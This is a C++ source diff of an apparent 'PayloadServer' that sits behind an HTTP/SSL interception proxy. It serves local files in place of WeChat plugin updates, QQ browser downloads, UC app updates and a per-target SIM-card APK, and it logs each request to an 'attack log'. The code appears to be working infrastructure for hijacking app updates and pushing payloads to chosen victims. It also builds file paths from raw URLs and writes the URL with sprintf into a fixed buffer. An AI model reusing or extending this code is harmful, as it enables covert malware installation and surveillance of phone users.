@@ -24,47 +24,50 @@ int PayloadServer::PluginServerProc(LPSSLPROXYPARAM spp ,char * recvbuf, int rec
 
 	int ret = 0;
 
-	*(recvbuf + recvlen) = 0;
-
 	char * httpdata = 0;
-
 	string httphdr = HttpUtils::getHttpHeader(recvbuf, recvlen,&httpdata);
+	if (httphdr == "") {
+		return 0;
+	}
 
-	string url = HttpUtils::getLongUrl(httphdr.c_str(), httphdr.length());
+	//string url = HttpUtils::getLongUrl(httphdr.c_str(), httphdr.length());
 
-	string destfn = HttpUtils::getUrl(recvbuf, recvlen);
+	string urlfn = HttpUtils::getUrl(httphdr.c_str(), httphdr.length());
+	string filename = "";
+	if (urlfn.c_str()[0] == '/')
+	{
+		filename = Public::getPluginPathWithoutSlash() + urlfn;
+	}
+	else {
+		filename = Public::getPluginPath() + urlfn;
+	}
+	ret = FileOper::isFileExist(filename);
+	if (ret == 0) {
+		log("%s %d file not exist:%s\r\n", __FUNCTION__, __LINE__, urlfn.c_str());
+		return 0;
+	}
 
 	string strip = HttpUtils::getIPstr(spp->saToClient.sin_addr.S_un.S_addr);
 
-	//string host = HttpUtils::getValueFromKey(httphdr.c_str(), "Host");
+	string host = HttpUtils::getValueFromKey(httphdr.c_str(), "Host");
 
-	string datetime = Public::getDateTime();
-
-	char szout[2048] = { 0 };
-	int outlen = wsprintfA(szout, "%s ssl recv url:%s,ip:%s,time:%s\r\n",__FUNCTION__, url.c_str(), strip.c_str(), datetime.c_str());
+	char szout[0x1000] ;
+	int outlen = sprintf(szout, "%s url:%s,ip:%s\r\n",__FUNCTION__, urlfn.c_str(), strip.c_str());
 	Public::writeLogFile(szout);
 	Public::writeFile(ATTACK_LOG_FILENAME, recvbuf, recvlen);
-
-	int flag = 1;
-	if (memcmp(recvbuf, "HEAD ", 5) == 0)
-	{
-		flag = 0;
-	}
 
 	int begin = 0;
 	int end = 0;
 	ret = HttpUtils::getRange(httphdr.c_str(), begin, end);
 	if (ret == 0)
 	{
-		printf("range start:%d,end:%d,file:%s\r\n", begin, end, destfn.c_str());
-
-		char * contentTypeFormat = getPartialContentType(destfn);
-
-		ret = SendPluginFile(destfn.c_str(), spp, contentTypeFormat, begin, end,flag);
+		log("range start:%d,end:%d,http:%s\r\n", begin, end, httphdr.c_str());
+		char * contentTypeFormat = getPartialContentType(filename);
+		ret = SendPluginFile(filename.c_str(), spp, contentTypeFormat, begin, end);
 	}
 	else {
-		char * contentTypeFormat = getContentType(destfn);
-		ret = SendPluginFile(destfn.c_str(), spp, contentTypeFormat,flag);
+		char * contentTypeFormat = getContentType(filename);
+		ret = SendPluginFile(filename.c_str(), spp, contentTypeFormat);
 	}
 
 	return ret;
@@ -72,17 +75,8 @@ int PayloadServer::PluginServerProc(LPSSLPROXYPARAM spp ,char * recvbuf, int rec
 
 
 
-int PayloadServer::SendPluginFile(const char * lpfn, LPSSLPROXYPARAM spp, const char * format, int start, int end, int flag) {
+int PayloadServer::SendPluginFile(string filename, LPSSLPROXYPARAM spp, const char * format, int start, int end) {
 	int ret = 0;
-
-	string filename = "";
-	if (lpfn[0] == '/')
-	{
-		filename = Public::getPluginPathWithoutSlash() + string(lpfn);
-	}
-	else {
-		filename = Public::getPluginPath() + string(lpfn);
-	}
 
 	char * lpdata = 0;
 	int filesize = 0;
@@ -116,12 +110,6 @@ int PayloadServer::SendPluginFile(const char * lpfn, LPSSLPROXYPARAM spp, const 
 	ret = SSL_write(spp->SSLToClient, szDataRespHdr, iDataRespHdrLen);
 
 	Public::writeFile(ATTACK_LOG_FILENAME,szDataRespHdr,iDataRespHdrLen);
-
-	if (flag == 0)
-	{
-		delete[] lpdata;
-		return TRUE;
-	}
 
 	int modulesize = SSL_MAX_BLOCK_SIZE;
 	int sendtimes = sendsize / modulesize;
@@ -160,23 +148,9 @@ int PayloadServer::SendPluginFile(const char * lpfn, LPSSLPROXYPARAM spp, const 
 
 
 
-
-
-
-
-
-int PayloadServer::SendPluginFile(const char * lpfn,LPSSLPROXYPARAM spp,const char * format, int flag) {
+int PayloadServer::SendPluginFile(string filename,LPSSLPROXYPARAM spp,const char * format) {
 
 	int ret = 0;
-
-	string filename = "";
-	if (lpfn[0] == '/')
-	{
-		filename = Public::getPluginPathWithoutSlash() + string(lpfn);
-	}
-	else {
-		filename = Public::getPluginPath() + string(lpfn);
-	}
 
 	char * lpdata = 0;
 	int filesize = 0;
@@ -193,12 +167,6 @@ int PayloadServer::SendPluginFile(const char * lpfn,LPSSLPROXYPARAM spp,const ch
 	ret = SSL_write(spp->SSLToClient, szDataRespHdr, iDataRespHdrLen);
 
 	Public::writeFile(ATTACK_LOG_FILENAME, szDataRespHdr, iDataRespHdrLen);
-
-	if (flag == 0)
-	{
-		delete[] lpdata;
-		return TRUE;
-	}
 
 	int modulesize = SSL_MAX_BLOCK_SIZE;
 	int sendtimes = filesize / modulesize;
@@ -241,45 +209,51 @@ int PayloadServer::PluginServerProc(LPHTTPPROXYPARAM hpp,char * recvbuf,int recv
 
 	int ret = 0;
 
-	*(recvbuf + recvlen) = 0;
 	char * httpdata = 0;
-
 	string httphdr = HttpUtils::getHttpHeader(recvbuf, recvlen,&httpdata);
-	string url = HttpUtils::getLongUrl(httphdr.c_str(), httphdr.length());
+	if (httphdr == "") {
+		return 0;
+	}
+	//string url = HttpUtils::getLongUrl(httphdr.c_str(), httphdr.length());
 
-	string destfn = HttpUtils::getUrl(recvbuf, recvlen);
+	string urlfn = HttpUtils::getUrl(httphdr.c_str(), httphdr.length());
+	string filename = "";
+	if (urlfn.c_str()[0] == '/')
+	{
+		filename = Public::getPluginPathWithoutSlash() + urlfn;
+	}
+	else {
+		filename = Public::getPluginPath() + urlfn;
+	}
+	ret = FileOper::isFileExist(filename);
+	if (ret == 0) {
+		log("%s %d file not exist:%s\r\n", __FUNCTION__, __LINE__, urlfn.c_str());
+		return 0;
+	}
 
 	string host = HttpUtils::getValueFromKey(httphdr.c_str(), "Host");
 
 	string strip = HttpUtils::getIPstr(hpp->saToClient.sin_addr.S_un.S_addr);
 
-	string datetime = Public::getDateTime();
-
-	char szout[2048] = { 0 };
-	int outlen = wsprintfA(szout, "%s http recv url:%s,ip:%s,time:%s\r\n",__FUNCTION__, url.c_str(), strip.c_str(), datetime.c_str());
+	char szout[0x1000];
+	int outlen = sprintf(szout, "%s url:%s,ip:%s\r\n",__FUNCTION__, urlfn.c_str(), strip.c_str());
 	Public::writeLogFile(szout);
 	Public::writeFile(ATTACK_LOG_FILENAME, recvbuf, recvlen);
-
-	int flag = 1;
-	if (memcmp(recvbuf,"HEAD ",5) == 0)
-	{
-		flag = 0;
-	}
 	
-	if (strstr(destfn.c_str(),WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME))
+	if (strstr(filename.c_str(),WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME))
 	{
 		char * szHttpRespHdrAppFormat = 
 	"HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nAccept-Ranges: none\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
-		ret = SendPluginFile(destfn.c_str(), hpp, szHttpRespHdrAppFormat, flag);	//must be application/octet-stream
+		ret = SendPluginFile(filename.c_str(), hpp, szHttpRespHdrAppFormat);	//must be application/octet-stream
 		return 0;
 	}
-	else if (strstr(destfn.c_str(), QQMINIBROWSER_FILE_NAME))
+	else if (strstr(filename.c_str(), QQMINIBROWSER_FILE_NAME))
 	{
 		char * szHttpRespHdrAppFormat = 
 	"HTTP/1.1 200 OK\r\nAccept-Ranges: none\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
-		ret = SendPluginFile(destfn.c_str(), hpp, szHttpRespHdrAppFormat, flag);	//must be application/octet-stream
+		ret = SendPluginFile(filename.c_str(), hpp, szHttpRespHdrAppFormat);	//must be application/octet-stream
 		return 0;
-	}else if (strstr(destfn.c_str(), SIMCARD_APK_FILENAME))
+	}else if (strstr(filename.c_str(), SIMCARD_APK_FILENAME))
 	{
 		string username = InformerInterface::getTarget(hpp->saToClient.sin_addr.S_un.S_addr, host.c_str());
 
@@ -289,7 +263,7 @@ int PayloadServer::PluginServerProc(LPHTTPPROXYPARAM hpp,char * recvbuf,int recv
 
 		char * szHttpRespHdrAppFormat = 
 	"HTTP/1.1 200 OK\r\nAccept-Ranges: none\r\nConnection: keep-alive\r\nContent-Type: application/vnd.android.package-archive\r\nContent-Length: %u\r\n\r\n";
-		ret = SendPluginFile(fileurl.c_str(), hpp, szHttpRespHdrAppFormat, flag);
+		ret = SendPluginFile(fileurl.c_str(), hpp, szHttpRespHdrAppFormat);
 		return 0;
 	}
 
@@ -298,36 +272,27 @@ int PayloadServer::PluginServerProc(LPHTTPPROXYPARAM hpp,char * recvbuf,int recv
 	ret = HttpUtils::getRange(httphdr.c_str(), begin, end);
 	if (ret == 0)
 	{
-		char * contentTypeFormat = getPartialContentType(destfn);
-		printf("range start:%d,end:%d,file:%s\r\n", begin, end, destfn.c_str());
-		ret = SendPluginFile(destfn.c_str(), hpp, contentTypeFormat, begin, end,flag);
+		char * contentTypeFormat = getPartialContentType(filename);
+		log("range start:%d,end:%d,http header:%s\r\n", begin, end, httphdr.c_str());
+		ret = SendPluginFile(filename.c_str(), hpp, contentTypeFormat, begin, end);
 	}
 	else {
-		char * contentTypeFormat = getContentType(destfn);
-		ret = SendPluginFile(destfn.c_str(), hpp, contentTypeFormat,flag);
+		char * contentTypeFormat = getContentType(filename);
+		ret = SendPluginFile(filename.c_str(), hpp, contentTypeFormat);
 	}
 
 	return ret;
 }
 
 
-int PayloadServer::SendPluginFile(const char * lpfn, LPHTTPPROXYPARAM lpparam, const char * szHttpRespHdrFormat, int start, int end, int flag) {
+int PayloadServer::SendPluginFile(string filename, LPHTTPPROXYPARAM lpparam, const char * szHttpRespHdrFormat, int start, int end) {
 	int ret = 0;
 	
-	if (strstr(lpfn, UCPPAPPSTORE_UPDATE_FILENAME) || strstr(lpfn, UCGAME_UPDATE_FILENAME) || strstr(lpfn, UCALOPHA_UPDATE_FILENAME) || 
-		strstr(lpfn, UCAMAP_UPDATE_FILENAME) )
+	if (strstr(filename.c_str(), UCPPAPPSTORE_UPDATE_FILENAME) || strstr(filename.c_str(), UCGAME_UPDATE_FILENAME) ||
+		strstr(filename.c_str(), UCALOPHA_UPDATE_FILENAME) ||strstr(filename.c_str(), UCAMAP_UPDATE_FILENAME) )
 	{
-		ret = HttpPartial::sendPartFileWithoutHdr(lpfn, lpparam->sockToClient, start, end);
+		ret = HttpPartial::sendPartFileWithoutHdr(filename, lpparam->sockToClient, start, end);
 		return ret;
-	}
-
-	string filename;
-	if (lpfn[0] == '/')
-	{
-		filename = Public::getPluginPathWithoutSlash() + string(lpfn);
-	}
-	else {
-		filename = Public::getPluginPath() + string(lpfn);
 	}
 
 	char * lpdata = 0;
@@ -365,12 +330,6 @@ int PayloadServer::SendPluginFile(const char * lpfn, LPHTTPPROXYPARAM lpparam, c
 
 	Public::writeFile(ATTACK_LOG_FILENAME, szDataRespHdr, iDataRespHdrLen);
 
-	if (flag == 0)
-	{
-		delete[] lpdata;
-		return TRUE;
-	}
-
 	ret = send(lpparam->sockToClient, lpdata + start, sendsize, 0);
 
 	delete[] lpdata;
@@ -386,16 +345,7 @@ int PayloadServer::SendPluginFile(const char * lpfn, LPHTTPPROXYPARAM lpparam, c
 }
 
 
-int PayloadServer::SendPluginFile(const char * lpfn, LPHTTPPROXYPARAM lpparam, char * szHttpRespHdrFormat, int flag) {
-
-	string filename="";
-	if (lpfn[0] == '/')
-	{
-		filename = Public::getPluginPathWithoutSlash() + string(lpfn);
-	}
-	else {
-		filename = Public::getPluginPath() + string(lpfn);
-	}
+int PayloadServer::SendPluginFile(string filename, LPHTTPPROXYPARAM lpparam, char * szHttpRespHdrFormat) {
 	
 	int ret = 0;
 	char * lpdata = 0;
@@ -412,12 +362,6 @@ int PayloadServer::SendPluginFile(const char * lpfn, LPHTTPPROXYPARAM lpparam, c
 	ret = send(lpparam->sockToClient, szDataRespHdr, iDataRespHdrLen, 0);
 
 	Public::writeFile(ATTACK_LOG_FILENAME, szDataRespHdr, iDataRespHdrLen);
-
-	if (flag == 0)
-	{
-		delete[] lpdata;
-		return TRUE;
-	}
 
 	ret = send(lpparam->sockToClient, lpdata, filesize, 0);
 	delete[] lpdata;
